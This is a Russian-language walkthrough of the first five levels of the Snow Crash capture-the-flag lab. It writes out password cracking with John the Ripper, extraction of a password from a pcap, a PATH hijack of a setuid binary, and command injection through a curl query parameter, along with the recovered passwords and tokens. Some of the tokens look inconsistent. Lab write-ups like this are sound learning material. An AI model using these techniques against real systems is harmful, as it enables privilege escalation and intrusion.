# level00

find / -user flag00 2>/dev/null
cat /usr/sbin/john

dcode.fr:
Rechercher un outil ввести содержимое файла
чуть ниже перейти по ссылке для поиска идентификатора Need to decrypt a message? Try our cipher identifier! https://www.dcode.fr/cipher-identifier

подойдет ROT Cipher https://www.dcode.fr/rot-cipher, можно цезаря
первый результат в списке - пароль

su flag00 с этим паролем nottoohardhere

getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
перехожу ко 2му уровню
su level01 x24ti5gi3x0ol2eh4esiuxias

# level01
пользователь:пароль(х или другой символ, /etc/shadow расшифрованные пароли):id пользователя uid: gid id группы: домашняя директория: дефолтный shell

Нахожу зашифрованный пароль flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
Создаю файл с этой строкой и передаю в john

https://download.openwall.net/pub/projects/john/contrib/macosx/
  ||
  \/
john-1.8.0.9-jumbo-macosx_avx2.zip

./john ~/Desktop/snow_crash/lvl01ForJohn
  cat john.pot
    42hDRfypTqqnw:abcdefg
либо 
./john ~/Desktop/snow_crash/lvl01ForJohn --show
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

su flag01
Password: abcdefg
Don't forget to launch getflag !

getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf

# level02
ls -la
cat level02.pcap 

https://www.tcpdump.org/manpages/tcpdump.1.html

tcpdump -r ~/level02.pcap -n -xq -tttt \
    'tcp[13] & 8 != 0 and src 59.233.235.218' 2>/dev/null |\
    grep -A 10000 "06:23:34" |\
    grep "0x0030" |\
    cut -d' ' -f5 |\
    ./decoder
 -n   ip   не конвертировать в доменное имя
 tcpdump -r не покажет тело пакета - только заголовки

 -xq покажет тело пакета
 -X  попытается как ascii расшифровать тело пакета

 tcp[13] находим заголовок, который отвечает за длину тела.

tcpdump -r ~/level02.pcap -xq
о tcp пакетах
 https://networkguru.ru/protokol-transportnogo-urovnia-tcp-chto-nuzhno-znat/
  ||
  \/
пакеты с флагами PSH не буферизуются, а сразу в приложение идут. Нам нужны именно они
 картинка Заголовок TCP с ней отсчитываю: source port - 0 и 1 байт, destination port - 2 и 3 ,
 sequence number 4-7 и т.д. => получаю флаги под номером 13
 среди них умножаю этот байт на 8 (00001000 - здесь пуш под номером 5, то есть 8)
tcp[13] & 8 != 0 проверяет, установлен ли этот флаг в 0 или 1


and src 59.233.235.218 фильтруем пакеты по отправителю (отправитель вводит пароль)

tcpdump -r ~/level02.pcap -n -Xq | nl | grep assword
по списку вижу первый непустой пакет - 06:23:34 после запроса пароля

grep -A 10000 "06:23:34" |\
    grep "0x0030" |\
все строки ниже этого времени и содержащие 0x0030 (там тело TCP пакета)
10000 количество отображаемых строк

cut -d' ' -f5 после пробела взять 5й столбец

получаю символ в 16ричной системе
перевожу в ascii. Для этого можно либо онлайн, либо свой декодер использовать (онлайн может не удалять символы при 7f встрече)
 получаю:
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c 0d
ft_wandrNDRelL0L

получаю  ft_waNDReL0L

su flag02 с этим паролем ft_waNDReL0L

getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
перехожу ко 3му уровню
su level03 kooda2puivaav1idi4f57q8iq

# level03
ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
x - можно запустить
флаг прав s -запустить с правами создателя

ltrace выведет все библиотечные функции, которые используются
ltrace ./level03

system("/usr/bin/env echo Exploit me")
создаю свой echo, меняю PATH на путь к себе вначале, запускаю level03
ls -la /
нахожу место допустимое для записи
d-wx-wx-wx   4 root root   80 Feb  6 13:14 tmp

создаю своё echo
#!/bin/bash
getflag

chmod 777 ./echo
export PATH=/tmp:$PATH

запускаю снова 
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

перехожу ко 4му уровню
su level04 qi0maab88jeaj46qoumi7maus

# level04
ls -la
cat level04.pl

обратиться к первому переданному аргументу и его значение присвоить переменной y
  $y = $_[0];

здесь  print `echo $y 2>&1`; ` работают аналогично system

index.py?x=$getflag

x(param("x"));
в квери параметре если указать index.py?x=$(getflag), подставится нужная команда вместо x
curl localhost:4747?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap